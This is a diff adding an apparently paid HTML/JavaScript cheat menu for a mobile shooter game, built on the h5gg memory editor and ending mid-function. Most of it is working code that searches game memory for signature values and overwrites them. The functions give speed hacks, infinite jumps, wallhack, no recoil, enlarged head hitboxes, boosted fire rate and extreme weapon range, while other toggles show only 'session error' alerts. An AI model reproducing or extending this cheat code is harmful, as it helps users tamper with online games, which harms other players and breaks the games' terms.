+				</body>
+					循环次数
+					<input type="range" id="xhcsdd" min="0.1" max="500" step="1" value="50" style="width:80%" />
+					<body>
+					<p id="para7"></p>
+					</body>
+				<input id="checkxzj" type="checkbox" onclick="fx1()">X轴增加
+				<input id="checkxjs" type="checkbox" onclick="fx2()">X轴减少
+				<br>
+				<br>
+				<input id="checkyzj" type="checkbox" onclick="fx3()">Y轴增加
+				<input id="checkyjs" type="checkbox" onclick="fx4()">Y轴减少
+                                </div>
+
+             <div v-show="tabValue==='v1x'">
+					<div class="aytext">
+					</div>
+<br>
+
+    <h3>無料配布(2024/03/06)</h3>
+    <h3>お問い合わせフォームの追加(2024/01/06)</h3>
+    <h3>VIP内容血の着色を追加(2024/01/06)</h3>
+    <h3>試作利用開始     
+    (2024/01/05)</h3>
+
+      </div> 
+
+           <div v-show="tabValue==='tnx'">
+					<div class="aytext">
+                 <br>
+                  <br>
+                   <p>Twitter @_cmvx0</p>
+                    <br>
+					       </div>
+
+				<script>
+
+function drawCache() {
+
+var ActorCount = readInt(Level + 0x8);
+
+    var tempArr = [];
+    for (var i = 0; i < ActorCount; i++) {
+        var actor = readLong(ActorArray + i * 8);
+        var rootComponent = readLong(actor + 0x10);
+         if (0 == readFloat(rootComponent + 0x1E4)) continue;
+         tempArr.push(actor);
+    }
+    actorCache = tempArr;
+}
+function clearCtx() {
+    ctx.clearRect(0, 0, canvasDom.width, canvasDom.height);
+}
+function setLineWidth(w) {
+    ctx.lineWidth = w;
+    ctx.lineWidth = 1;
+}
+function readInt(addr) {
+    return Number(h5gg.getValue(addr, "I32"));
+}
+function readLong(addr) {
+    return Number(h5gg.getValue(addr, "I64"));
+}
+
+function c2() {
+    if (abc == 1 ) {
+   
+ alert("session error💀\n管理者にお問い合わせください")
+
+   abc = 2;
+    } else if(abc == 2 ) {
+alert("session error💀\n管理者にお問い合わせください")
+
+   abc = 1;
+    } else {
+    }
+    }
+function c3() {
+    if (mid == 1 ) {
+   
+alert("session error💀\n管理者にお問い合わせください")
+
+mid = 2;
+    } else if(mid == 2 ) {
+alert("session error💀\n管理者にお問い合わせください")
+    mid = 1;
+    } else {
+    }
+    }
+   function c4() {
+    if (abb == 1 ) {
+   
+alert("session error💀\n管理者にお問い合わせください")
+
+abb = 2;
+    } else if(abb == 2 ) {
+alert("session error💀\n管理者にお問い合わせください")
+   abb = 1;
+    } else {
+    }
+    }
+
+
+   function c5() {
+    if (aac == 1 ) {
+   
+alert("session error💀\n管理者にお問い合わせください")
+
+aac = 2;
+    } else if(aac == 2 ) {
+alert("session error💀\n管理者にお問い合わせください")
+   aac = 1;
+    } else {
+    }
+    }
+
+   function c7() {
+    if (sir == 1 ) {
+   
+alert("session error💀\n管理者にお問い合わせください")
+
+sir = 2;
+    } else if(sir == 2 ) {
+alert("session error💀\n管理者にお問い合わせください")
+   sir = 1;
+    } else {
+    }
+    }
+   
+function updateValues() {
+    
+alert("session error💀\n管理者にお問い合わせください")
+
+}
+
+
+
+function c9() {//アンテナ検索
+
+alert("session error💀\n管理者にお問い合わせください")
+
+  var ann = 1;
+
+function c8() {//アンテナ
+    if (ann == 1 ) {
+   alert("session error💀\n管理者にお問い合わせください")
+    ann = 2;
+    } else if(ann == 2 ) {
+    alert("session error💀\n管理者にお問い合わせください")
+    ann = 1;
+    } else {
+    }
+    }
+  
+
+function c6() {//アンテナ
+
+alert("session error💀\n管理者にお問い合わせください")
+}
+
+function c11() { 
+alert("session error💀\n管理者にお問い合わせください")
+          }
+
+function c12() {//足加速
+alert("session error💀\n管理者にお問い合わせください")
+}
+
+
+
+function c13() {//無反動
+alert("session error💀\n管理者にお問い合わせください")
+}
+
+
+
+
+
+
+function c14() {//しゃれーと
+
+   
+alert("session error💀\n管理者にお問い合わせください")
+}
+
+
+    
+
+function c15(){
+alert("session error💀\n管理者にお問い合わせください")
+}
+
+
+
+
+
+
+function c19(){
+alert("session error💀\n管理者にお問い合わせください")
+}
+
+function c20(){     
+alert("session error💀\n管理者にお問い合わせください")
+}
+
+
+function c21(){     
+alert("session error💀\n管理者にお問い合わせください")
+}
+
+
+function c22(){     
+alert("session error💀\n管理者にお問い合わせください")
+}
+
+
+
+
+
+function c23() {
+    if (kar == 1 ) {
+
+alert("session error💀\n管理者にお問い合わせください")
+   
+kar = 2;
+    } else if(kar == 2 ) {
+alert("session error💀\n管理者にお問い合わせください")
+    kar = 1;
+    } else {
+    }
+    }
+
+function c24() {
+    if (egg == 1 ) {
+   
+alert("session error💀\n管理者にお問い合わせください")
+
+egg = 2;
+    } else if(egg == 2 ) {
+alert("session error💀\n管理者にお問い合わせください")
+    egg = 1;
+    } else {
+    }
+    }
+
+function c16() {//無限ジャンプ
+alert("session error💀\n管理者にお問い合わせください")
+h5gg.clearResults();
+}
+
+function c17() {//人物透視
+alert("session error💀\n管理者にお問い合わせください")
+}
+
+function c25() {//
+alert("session error💀\n管理者にお問い合わせください")
+}
+
+    var isModifying = false;
+  var originalValues = [];
+
+  function getRandomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+  }
+
+  function readLong(addr) {
+    return Number(h5gg.getValue(addr, "I64"));
+  }
+
+  function modify(addr) {
+    originalValues.push({ address: addr, value: h5gg.getValue(addr, "F32") });
+    h5gg.setValue(addr, '9999', 'F32');
+  }
+
+  function revert() {
+    while (originalValues.length > 0) {
+      var originalValue = originalValues.pop();
+      h5gg.setValue(originalValue.address, originalValue.value, 'F32');
+    }
+  }
+
+  function modifyAndRevert() {
+    if (isModifying) {
+      var baseAddr = Number(h5gg.getRangesList(0)[0].start);
+      var addr1 = readLong(baseAddr + 0x4a0);
+      addr1 = readLong(addr1 + 0x19);
+      addr1 = readLong(addr1 + 0x1A);
+      addr1 = readLong(addr1 + 0x37);
+
+      var addresses = [0x310, 0x14, 0x290, 0x137];
+      var chosenAddresses = [];
+      for (var i = 0; i < 2; i++) {
+        var chosenAddr = addresses[getRandomInt(0, addresses.length - 1)];
+        chosenAddresses.push(addr1 + chosenAddr);
+      }
+
+      chosenAddresses.forEach(modify);
+
+      setTimeout(function() {
+        revert();
+        modifyAndRevert();
+      }, 230);
+    }
+  }
+
+function c26() {
+    if (nji == 1 ) {
+
+alert("session error💀\n管理者にお問い合わせください")
+   
+nji = 2;
+    } else if(nji == 2 ) {
+
+alert("session error💀\n管理者にお問い合わせください")
+
+    nji = 1;
+    } else {
+    }
+    }
+
+    function c27() {
+    if (kyo == 1 ) {
+   
+alert("session error💀\n管理者にお問い合わせください")
+
+kyo = 2;
+    } else if(kyo == 2 ) {
+alert("session error💀\n管理者にお問い合わせください")
+   kyo = 1;
+    } else {
+    }
+    }
+
+    function showOptions() {
+            alert("session error💀\n管理者にお問い合わせください")
+        }
+
+        function showOptionn() {
+            alert("session error💀\n管理者にお問い合わせください")
+        }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   function ikisugi() {
+    if (hmn == 1 ) {
+
+   h5gg.clearResults();
+        h5gg.searchNumber('90308608', 'I32', '0x100000000', '0x300000000');
+        var count = h5gg.getResultsCount();
+        var r = h5gg.getResults(count);
+        var cnt = 0;
+        for(var i=0; i<count; i++) {
+            var addr1 = r[i].address;
+            var shuzhi1 = h5gg.getValue((Number(addr1) + 4), "I32");
+            var shuzhi2 = h5gg.getValue((Number(addr1) + 12), "I32");
+            var dizhi1 = (Number(addr1) + -4);
+            var dizhi2 = (Number(addr1) + 8);
+            var dizhi3 = (Number(addr1) + 20);
+            var dizhi4 = (Number(addr1) + 32);
+            var dizhi5 = (Number(addr1) + 44);
+            var dizhi6 = (Number(addr1) + 56);
+            var dizhi7 = (Number(addr1) + 72);
+            var dizhi8 = (Number(addr1) + 88);
+            var dizhi9 = (Number(addr1) + 100);
+            var dizhi10 = (Number(addr1) + 116);
+            var dizhi11 = (Number(addr1) + 132);
+            var dizhi12 = (Number(addr1) + 144);
+            var dizhi13 = (Number(addr1) + 160);
+            var dizhi14 = (Number(addr1) + 180);
+            var dizhi15 = (Number(addr1) + 196);
+            var dizhi16 = (Number(addr1) + 212);
+            var dizhi17 = (Number(addr1) + 224);
+            var dizhi18 = (Number(addr1) + 260);
+            var dizhi19 = (Number(addr1) + 276);
+            var dizhi20 = (Number(addr1) + 288);
+            var dizhi21 = (Number(addr1) + 304);
+            var dizhi22 = (Number(addr1) + 316);
+            var dizhi23 = (Number(addr1) + 328);
+            var dizhi24 = (Number(addr1) + 344);
+            var dizhi25 = (Number(addr1) + 356);
+
+if(
+shuzhi1 == 565248 &&
+shuzhi2 == 8061065
+) 
+{
+h5gg.setValue(dizhi1,1999515220, "I32");
+h5gg.setValue(dizhi2,1999515220, "I32");
+h5gg.setValue(dizhi3,1999515220, "I32");
+h5gg.setValue(dizhi4,1999515220, "I32");
+h5gg.setValue(dizhi5,1999515220, "I32");
+h5gg.setValue(dizhi6,1999515220, "I32");
+h5gg.setValue(dizhi7,1999515220, "I32");
+h5gg.setValue(dizhi8,1999515220, "I32");
+h5gg.setValue(dizhi9,1999515220, "I32");
+h5gg.setValue(dizhi10,1999515220, "I32");
+h5gg.setValue(dizhi11,1999515220, "I32");
+h5gg.setValue(dizhi12,1999515220, "I32");
+h5gg.setValue(dizhi13,1999515220, "I32");
+h5gg.setValue(dizhi14,1999515220, "I32");
+h5gg.setValue(dizhi15,1999515220, "I32");
+h5gg.setValue(dizhi16,1999515220, "I32");
+h5gg.setValue(dizhi17,1999515220, "I32");
+h5gg.setValue(dizhi18,1999515220, "I32");
+h5gg.setValue(dizhi19,1999515220, "I32");
+h5gg.setValue(dizhi20,1999515220, "I32");
+h5gg.setValue(dizhi21,1999515220, "I32");
+h5gg.setValue(dizhi22,1999515220, "I32");
+h5gg.setValue(dizhi23,1999515220, "I32");
+h5gg.setValue(dizhi24,1999515220, "I32");
+h5gg.setValue(dizhi25,1999515220, "I32");
+
+
+           
+           }
+      }
+        
+h5gg.clearResults();
+        h5gg.searchNumber('91815936', 'I32', '0x100000000', '0x300000000');
+        var count = h5gg.getResultsCount();
+        var r = h5gg.getResults(count);
+        var cnt = 0;
+        for(var i=0; i<count; i++) {
+            var addr1 = r[i].address;
+            var shuzhi1 = h5gg.getValue((Number(addr1) + 4), "I32");
+            var shuzhi2 = h5gg.getValue((Number(addr1) + 12), "I32");
+            var shuzhi3 = h5gg.getValue((Number(addr1) + 16), "I32");
+            var shuzhi4 = h5gg.getValue((Number(addr1) + 28), "I32");
+            var dizhi1 = (Number(addr1) + 32);
+            var dizhi2 = (Number(addr1) + 44);
+            var dizhi3 = (Number(addr1) + 56);
+            var dizhi4 = (Number(addr1) + 68);
+            var dizhi5 = (Number(addr1) + 80);
+            var dizhi6 = (Number(addr1) + 92);
+            var dizhi7 = (Number(addr1) + 104);
+            var dizhi8 = (Number(addr1) + 116);
+            var dizhi9 = (Number(addr1) + 128);
+        
+if(
+shuzhi1 == 164864 &&
+shuzhi2 == 26607618 &&
+shuzhi3 == 156160 &&
+shuzhi4 == 157440
+) 
+{
+h5gg.setValue(dizhi1,1630416472, "I32");
+h5gg.setValue(dizhi2,1630416472, "I32");
+h5gg.setValue(dizhi3,1630416472, "I32");
+h5gg.setValue(dizhi4,1630416472, "I32");
+h5gg.setValue(dizhi5,1630416472, "I32");
+h5gg.setValue(dizhi6,1630416472, "I32");
+h5gg.setValue(dizhi7,1630416472, "I32");
+h5gg.setValue(dizhi8,1630416472, "I32");
+h5gg.setValue(dizhi9,1630416472, "I32");
+
+
+
+           
+           }
+      }
+        
+h5gg.clearResults();
+        h5gg.searchNumber('91815958', 'I32', '0x100000000', '0x300000000');
+        var count = h5gg.getResultsCount();
+        var r = h5gg.getResults(count);
+        var cnt = 0;
+        for(var i=0; i<count; i++) {
+            var addr1 = r[i].address;
+            var shuzhi1 = h5gg.getValue((Number(addr1) + 4), "I32");
+            var shuzhi2 = h5gg.getValue((Number(addr1) + 12), "I32");
+            var shuzhi3 = h5gg.getValue((Number(addr1) + 16), "I32");
+            var shuzhi4 = h5gg.getValue((Number(addr1) + 24), "I32");
+            var dizhi1 = (Number(addr1) + 68);
+            var dizhi2 = (Number(addr1) + 84);
+            var dizhi3 = (Number(addr1) + 96);
+           
+        
+if(
+shuzhi1 == 1537024 &&
+shuzhi2 == 427032584 &&
+shuzhi3 == 1744128 &&
+shuzhi4 == 7208962
+) 
+{
+h5gg.setValue(dizhi1,1630416472, "I32");
+h5gg.setValue(dizhi2,1630416472, "I32");
+h5gg.setValue(dizhi3,1630416472, "I32");
+
+
+           
+           }
+      }
+
+alert("session error💀\n管理者にお問い合わせください")
+
+
+hmn = 2;
+    } else if(hmn == 2 ) {
+
+alert("session error💀\n管理者にお問い合わせください")
+
+   hmn = 1;
+    } else {
+    }
+    }
+
+   function kugiri() {
+    if (hmn == 1 ) {
+   
+alert("低于这个都可以正常使用")
+
+
+hmn = 2;
+    } else if(hmn == 2 ) {
+
+alert("设备之间可能存在差异")
+
+   hmn = 1;
+    } else {
+    }
+    }
+
+
+   function setumei() {
+    if (stm == 1 ) {
+   
+alert("1.着色はオンオフを繰り返せば入ります。2.赤着色-全マップ対応。3.緑着色-嵐のみ。4.白着色-嵐のみ。5.黒着色-嵐のみ")
+
+
+
+stm = 2;
+    } else if(stm == 2 ) {
+
+alert("分からない場合はTwitterへ")
+
+   stm = 1;
+    } else {
+    }
+    }
+
+
+
+function otoiawase() {
+  // プロンプトを表示して1回目の入力を取得
+  const userInput1 = prompt("Twitter IDもしくは🎫IDを\nご記入ください。");
+
+  // 1回目の入力がある場合のみ、2回目の入力を受け付ける
+  if (userInput1 !== null && userInput1 !== "") {
+    // プロンプトを表示して2回目の入力を取得
+    const userInput2 = prompt("お問い合わせ内容を入力");
+
+    // 2回目の入力がある場合のみWebhookに送信
+    if (userInput2 !== null && userInput2 !== "") {
+
+      // 埋め込みメッセージを作成
+      const embedMessage = {
+        embeds: [{
+          title: "mod menu利用者", //グレー色
+          fields: [
+            { name: "アカウント ID", value: userInput1 },
+            { name: "お問い合わせ内容", value: userInput2 }
+          ],
+          color: 3447003  // 青色
+        }]
+      };
+
+      // WebhookにPOSTリクエストを送信
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(embedMessage)
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error("Webhookにメッセージを送信できませんでした。");
+        }
+        alert("お問い合わせありがとうございました。\n送ってもらいましたIDにて個人的に回答を\n致しますので今しばらくお待ちください。");
+      })
+      .catch(error => {
+        console.error(error);
+        alert("送信先が削除されている為送信できませんでした。");
+      });
+    }
+  }
+}
+
+function alarts(main, sub) {
+var alar = document.getElementById('alart');
+alar.style.opacity = 1;
+document.getElementById('maintxt').innerHTML = main;
+document.getElementById('subtxt').innerHTML = sub;
+ setTimeout(function() {
+ alar.style.opacity = 0;
+ }, 3500);}
+
+function kalart(ki) {
+var alar = document.getElementById('kalart');
+alar.style.opacity = 1;
+document.getElementById('kaitxt').innerHTML = ki;
+ setTimeout(function() {
+ alar.style.opacity = 0;
+ }, 3500);}
+
+setTimeout(function() {
+alarts("微通信:Ruidayo1");
+
+setTimeout(function() {
+kalart("ご購入ありがとうございます。お楽しみください");
+
+}, 5000);
+}, 1000);
+function mapmap() {
+if(yu){
+yu = false;
+
+ttysnj = false;
+yydsnj = false;
+document.getElementById('maps').innerHTML = "OFF";
+} else {
+yu = true;
+
+document.getElementById('maps').innerHTML = "ON";
+}}
+
+	function ttys(){
+
+		if(ttysnj){
+			ttysnj = false;
+		}else{
+			ttysnj = true;
+		}
+	}
+	function yyds(){
+		if(yydsnj){
+			yydsnj = false;
+		}else{
+			yydsnj = true;
+		}
+	}
+
+//h5gg.setValue(d4,v, "F32");
+//h5gg.setValue(d3,v, "F32");
+//h5gg.setValue(d3,v, "F32");
+//var e = 9999;
+//var v = 1;
+//var r = 30;
+//var f = 0.8524374;
+//var c = 0.7;
+//var x = 5;
+
+
+function kent() {
+if(yu){
+} else {
+
+ttysnj = false;
+yydsnj = false;
+document.getElementById('aniji').innerHTML = "OFF";
+document.getElementById('gniji').innerHTML = "OFF";
+}
+}
+
+
+function kentn() {
+if(ttysnj==true||yydsnj==true){
+for(var i=0; i<countnj; i++) {
+nnnn = rnj[i].address;
+njd1 = h5gg.getValue((Number(nnnn) + 0), "F32");
+njd2 = h5gg.getValue((Number(nnnn) + 4), "F32");
+njd3 = h5gg.getValue((Number(nnnn) + 4), "I32");
+if( ( njd1 == njmax || njd1 == njora  || njd1 == njgre || njd1 == njmm7 )
+&& ( njd2 == njmax || njd2 == njora  || njd2 == njgre || njd2 == njmm4 || njd3 == njmm4u) )
+{
+} else {
+
+           ttysnj = false;
+           yydsnj = false;
+           njx = 0;
+           document.getElementById('aniji').innerHTML = "OFF";
+           document.getElementById('gniji').innerHTML = "OFF";
+           yu = false;
+           document.getElementById('maps').innerHTML = "OFF";
+}
+}
+}
+}
+
+
+                        
+
+
+
+
+
+
+
+     function asi() {
+h5gg.clearResults();
+var h222 = prompt("足の速さ元値1");
+h5gg.searchNumber('22.5', 'F64', '0x100000000', '0x200000000');
+h5gg.searchNearby('1', 'F64', '0x100');
+h5gg.searchNearby('0.01', 'F64', '0x100');
+h5gg.searchNumber('1', 'F64', '0x100000000', '0x200000000');
+var count = h5gg.getResultsCount();
+var r = h5gg.getResults(count);
+for(var i=0; i<count; i++) {
+var addr1 = r[i].address;
+var dizhi1 = (Number(addr1) + -16);
+var shuzhi1 = h5gg.getValue(dizhi1, "F64");
+h5gg.setValue(addr1,h222, "F64");
+}
+}
+ function sitata() {
+  if ( sitana == 0 ) {
+   sitana = 1;
+   h5gg.clearResults();
+   h5gg.searchNumber('0.7071068', 'F32', '0x100000000', '0x200000000');
+   h5gg.searchNearby('0.621610', 'F32', '0x24');
+   h5gg.searchNearby('0.01', 'F32', '0x24');
+   h5gg.searchNearby('0.5', 'F32', '0x24');
+   h5gg.searchNearby('1', 'F32', '0x24');
+   h5gg.searchNumber('1', 'F32', '0x100000000', '0x200000000');
+   counts = h5gg.getResultsCount();
+   rs = h5gg.getResults(counts);
+   for(var i=0; i<counts; i++) {
+   addrs = rs[i].address;
+   h5gg.setValue(addrs,"2.62", "F32");
+   }
+   } else {
+   sitana = 0;
+   for(var i=0; i<counts; i++) {
+   addrs = rs[i].address;
+   h5gg.setValue(addrs,"1", "F32");
+   }
+   }
+   }
+
+ function sitata45() {
+  if ( sitana == 0 ) {
+   sitana = 1;
+   h5gg.clearResults();
+   h5gg.searchNumber('0.7071068', 'F32', '0x100000000', '0x180000000');
+   h5gg.searchNearby('0.621610', 'F32', '0x24');
+   h5gg.searchNearby('0.01', 'F32', '0x24');
+   h5gg.searchNearby('0.5', 'F32', '0x24');
+   h5gg.searchNearby('1', 'F32', '0x24');
+   h5gg.searchNumber('1', 'F32', '0x100000000', '0x200000000');
+   var countss = h5gg.getResultsCount();
+   var rss = h5gg.getResults(countss);
+   for(var i=0; i<countss; i++) {
+   var addrss = rss[i].address;
+   h5gg.setValue(addrss,"45", "F32");
+   }
+   } else {
+   sitana = 0;
+   for(var i=0; i<countss; i++) {
+   var addrss = rss[i].address;
+   h5gg.setValue(addrss,"1", "F32");
+   }
+   }
+   }
+
+   
+   function speed() {
+    if ( flyspd == 0 ) {
+   var hks = prompt("速度20~300");
+   h5gg.clearResults();
+   h5gg.searchNumber('0.436', 'F64', '0x100000000', '0x200000000');
+   h5gg.searchNearby('0.6', 'F64', '0x100');
+   h5gg.searchNumber('0.6', 'F64', '0x100000000', '0x200000000');
+   h5gg.searchNearby('-0.1', 'F64', '0x40');
+   var countf = h5gg.getResultsCount();
+   var r = h5gg.getResults(countf);
+   for(var i=0; i<countf; i++) {
+   var addr7 = r[i].address;
+   h5gg.setValue(addr7,hks, "F64");
+   }flyspd = 1;
+   spdstate = hks;} else if ( flyspd == 1 ) {
+   for(var i=0; i<countf; i++) {
+   var addr7 = r[i].address;
+   h5gg.setValue(addr7,-0.1, "F64");
+   }flyspd = 2;
+   spdstate = "OFF";} else if ( flyspd == 2 ) {   
+   var hkss = prompt("速度20~301");
+   for(var i=0; i<countf; i++) {
+   var addr7 = r[i].address;
+   h5gg.setValue(addr7,hkss, "F64");
+   }flyspd = 1;
+   spdstate = hkss;}
+   }
+   
+					function yjxg(){
+						xgst();
+						xgsj();
+						xgsgb();
+					}
+				
+				
+					function sckq(){
+						if(sckqpd){
+							for(i = 0;i<scarsz.length;i++){
+								h5gg.setValue(scarsz[i],'870', 'F64');
+								document.getElementById("check10").checked = false;
+								sckqpd = false;
+							}
+						}else{
+							for(i = 0;i<scarsz.length;i++){
+								h5gg.setValue(scarsz[i],'99999999', 'F64');
+								document.getElementById("check10").checked = true;
+								sckqpd = true;
+							}
+						}
+					}
+					
+					
+					function m4kq(){
+						if(mspd){
+							for(i = 0;i<mssz3.length;i++){
+								h5gg.setValue(mssz3[i],'880', 'F64');
+								document.getElementById("check11").checked = false;
+								mspd = false;
+							}
+						}else{
+							for(i = 0;i<mssz3.length;i++){
+								h5gg.setValue(mssz3[i],'99999999', 'F64');
+								document.getElementById("check11").checked = true;
+								mspd = true;
+							}
+						}
+					}
+					
+
+					function jiuwkq(){
+						if(jiuwpd){
+							for(i = 0;i<jiuw3.length;i++){
+								h5gg.setValue(jiuw3[i],'900', 'F64');
+								document.getElementById("check12").checked = false;
+								jiuwpd = false;
+							}
+						}else{
+							for(i = 0;i<jiuw3.length;i++){
+								h5gg.setValue(jiuw3[i],'99999999', 'F64');
+								document.getElementById("check12").checked = true;
+								jiuwpd = true;
+							}
+						}
+					}
+					
+					
+
+					function augkq(){
+						if(augpd){
+							for(i = 0;i<augsz3.length;i++){
+								h5gg.setValue(augsz3[i],'715', 'F64');
+								document.getElementById("check13").checked = false;
+								augpd = false;
+							}
+						}else{
+							for(i = 0;i<augsz3.length;i++){
+								h5gg.setValue(augsz3[i],'99999999', 'F64');
+								document.getElementById("check13").checked = true;
+								augpd = true;
+							}
+						}
+					}
+					
+					
+					function limhwukq(){
+						if(lingwupd){
+							for(i = 0;i<lingwusz3.length;i++){
+								h5gg.setValue(lingwusz3[i],'400', 'F64');
+								document.getElementById("check14").checked = false;
+								lingwupd = false;
+							}
+						}else{
+							for(i = 0;i<lingwusz3.length;i++){
+								h5gg.setValue(lingwusz3[i],'99999999', 'F64');
+								document.getElementById("check14").checked = true;
+								lingwupd = true;
+							}
+						}
+					}
+					function mkkq(){
+						if(mk5pd){
+							for(i = 0;i<mk5sz3.length;i++){
+								h5gg.setValue(mk5sz3[i],'400', 'F64');
+								document.getElementById("check15").checked = false;
+								mk5pd = false;
+							}
+						}else{
+							for(i = 0;i<mk5sz3.length;i++){
+								h5gg.setValue(mk5sz3[i],'99999999', 'F64');
+								document.getElementById("check15").checked = true;
+								mk5pd = true;
+							}
+						}
+					}
+					
+					function uzikq(){
+						if(uzipd){
+							for(i = 0;i<uzisz3.length;i++){
+								h5gg.setValue(uzisz3[i],'350', 'F64');
+								document.getElementById("check16").checked = false;
+								uzipd = false;
+							}
+						}else{
+							for(i = 0;i<uzisz3.length;i++){
+								h5gg.setValue(uzisz3[i],'99999999', 'F64');
+								document.getElementById("check16").checked = true;
+								uzipd = true;
+							}
+						}
+					}
+					
+					
+					function awmkq(){
+						if(awmpd){
+							for(i = 0;i<awmsz3.length;i++){
+								h5gg.setValue(awmsz3[i],'910', 'F64');
+								document.getElementById("check17").checked = false;
+								awmpd = false;
+							}
+						}else{
+							for(i = 0;i<awmsz3.length;i++){
+								h5gg.setValue(awmsz3[i],'99999999', 'F64');
+								document.getElementById("check17").checked = true;
+								awmpd = true;
+							}
+						}
+					}
+					
+					function m24kq(){
+						if(m24pd){
+							for(i = 0;i<m24sz3.length;i++){
+								h5gg.setValue(m24sz3[i],'790', 'F64');
+								document.getElementById("check18").checked = false;
+								m24pd = false;
+							}
+						}else{
+							for(i = 0;i<m24sz3.length;i++){
+								h5gg.setValue(m24sz3[i],'99999999', 'F64');
+								document.getElementById("check18").checked = true;
+								m24pd = true;
+							}
+						}
+					}
+					
+					
+					function babakq(){
+						if(babapd){
+							for(i = 0;i<babasz3.length;i++){
+								h5gg.setValue(babasz3[i],'800', 'F64');
+								document.getElementById("check19").checked = false;
+								babapd = false;
+							}
+						}else{
+							for(i = 0;i<babasz3.length;i++){
+								h5gg.setValue(babasz3[i],'99999999', 'F64');
+								document.getElementById("check19").checked = true;
+								babapd = true;
+							}
+						}
+					}
+					
+					
+					function m18kq(){
+						if(m18pd){
+							for(i = 0;i<m18sz3.length;i++){
+								h5gg.setValue(m18sz3[i],'760', 'F64');
+								document.getElementById("check20").checked = false;
+								m18pd = false;
+							}
+						}else{
+							for(i = 0;i<m18sz3.length;i++){
+								h5gg.setValue(m18sz3[i],'99999999', 'F64');
+								document.getElementById("check20").checked = true;
+								m18pd = true;
+							}
+						}
+					}
+					
+
+					
+					function staa(){
+						toudza = [];
+						h5gg.clearResults();
+						var hk6 = dggdd;
+						if(hk6 == 0){
+							hk6 = 0.28;
+						}
+						stdx = suotoudx;
+						tousl = 0;
+                                                h5gg.searchNumber('0.15', 'F32', '0x280000000', '0x300000000');
+                                                var count = h5gg.getResultsCount();
+                                                var r = h5gg.getResults(count);
+                                                var cnt = 0;
+                                                for(var i=0; i<count; i++) {
+                                                 var addr1 = r[i].address;
+                                                 var shuzhi1 = h5gg.getValue((Number(addr1) + -16), "I32");
+                                                 var shuzhi2 = h5gg.getValue((Number(addr1) + -20), "I32");
+
+                                                 if(
+                                                  shuzhi1 == 1 &&
+                                                  shuzhi2 == 1 
+                                                 ) 
+                                                 {
+                                                 h5gg.setValue(addr1,hk6, "F32");
+           
+                                                }
+						}
+						h5gg.clearResults();
+						alert('范围头');
+					}
+					function pahs(){
+						if(paoapd){					
+							if(pahspd){
+								for(i = 0;i<f;i++){
+									h5gg.setValue(paoajgsz[i],'1.6', 'F64');
+									document.getElementById("check1").checked = false;
+									pahspd = false;
+								}
+							}else{
+								for(i = 0;i<f;i++){
+									h5gg.setValue(paoajgsz[i],'6.25', 'F64');
+									document.getElementById("check1").checked = true;
+									pahspd = true;
+								}
+							}
+						}else{
+							alert('你还没有预搜索此功能 跑A')
+							document.getElementById("check1").checked = false;
+						}
+					}
+					function zdjshs(){
+						if(jiasupd){					
+							if(jshspd){
+								for(i = 0;i<bljs;i++){
+									h5gg.setValue(jsjg[i],'1.0', 'F64');
+									document.getElementById("check2").checked = false;
+									jshspd = false;
+								}
+							}else{
+								for(i = 0;i<bljs;i++){
+									h5gg.setValue(jsjg[i],aaaaa.value, 'F64');
+									document.getElementById("check2").checked = true;
+									jshspd = true;
+								}
+							}
+						}else{
+							alert('你还没有预搜索此功能 加速')
+							document.getElementById("check2").checked = false;
+						}
+					}
+
+
+
+
+
+
+
+
+
+
+
+
+
+					function xgst(){
+						for(h = 0;h < tousl;h++){
+							//if(h5gg.getValue(toudza[h],'F32') == stdx){
+								h5gg.setValue(toudza[h],xstdxa, 'F32');
+							//}
+						}
+					}
+					
+					function xgsj(){
+						for(h = 0;h < jiasl;h++){
+							//if(h5gg.getValue(jiadza[h],'F32') == sjdx){
+								h5gg.setValue(jiadza[h],xsjdxa, 'F32');
+							//}
+						}
+					}
+
+					function xgsgb(){
+						for(h = 0;h < gbsldx;h++){
+							//if(h5gg.getValue(gbdzsz[h]),'F32') == gbdx){
+								h5gg.setValue(gbdzsz[h],xsgbdxa, 'F32');
+							//}
+						}
+					}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+					function jshs(){
+						if(shesupd){					
+							if(sszv){
+								for(i = 0;i<ssszsl;i++){
+									h5gg.setValue(shesudzag[i],'1.0', 'F64');
+									document.getElementById("check8").checked = false;
+									sszv = false;
+								}
+							}else{
+								for(i = 0;i<ssszsl;i++){
+									h5gg.setValue(shesudzag[i],sssza, 'F64');
+									document.getElementById("check8").checked = true;
+									sszv = true;
+								}
+							}
+						}else{
+							alert('你还没有预搜索此功能 射速')
+							document.getElementById("check8").checked = false;
+						}
+					}
+					
+					function lths(){
+						if(ltpd){					
+							if(lthspd){
+								for(i = 0;i<lt;i++){
+									h5gg.setValue(ltdz[i],'0.55', 'F32');
+									document.getElementById("check3").checked = false;
+									lthspd = false;
+								}
+							}else{
+								for(i = 0;i<lt;i++){
+									h5gg.setValue(ltdz[i],'9999999999.0', 'F32');
+									document.getElementById("check3").checked = true;
+									lthspd = true;
+								}
+							}
+						}else{
+							alert('你还没有预搜索此功能 连跳')
+							document.getElementById("check3").checked = false;
+						}
+					}
+					function gths(){
+						if(gtpd){					
+							if(gthspd){
+								for(i = 0;i<tysl2;i++){
+									h5gg.setValue(tygd2[i],'0.1', 'F64');
+									document.getElementById("check4").checked = false;
+									gthspd = false;
+								}
+							}else{
+								for(i = 0;i<tysl2;i++){
+									h5gg.setValue(tygd2[i],gtaaas.value, 'F64');
+									document.getElementById("check4").checked = true;
+									gthspd = true;
+								}
+							}
+						}else{
+							alert('你还没有预搜索此功能 高跳');
+							document.getElementById("check4").checked = false;
+						}
+					}
+					function zhuanq(){
+						if(zqkgaa){	
+							if(zqkga2){
+								for(i = 0;i<qd;i++){
+									h5gg.setValue(zqjg2[i],'1000', 'F32');
+									document.getElementById("check5").checked = false;
+									zqkga2 = false;
+								}
+							}else{
+								for(i = 0;i<qd;i++){
+									h5gg.setValue(zqjg2[i],'-100', 'F32');
+									document.getElementById("check5").checked = true;
+									zqkga2 = true;
+								}
+							}
+						}else{
+							alert('你还没有预搜索转圈');
+							document.getElementById("check5").checked = false;
+						}
+					}
+				
+					
+					function qczaw(){
+						if(qczawpd1){	
+							if(qczawpd2){
+								for(i = 0;i<zawsl;i++){
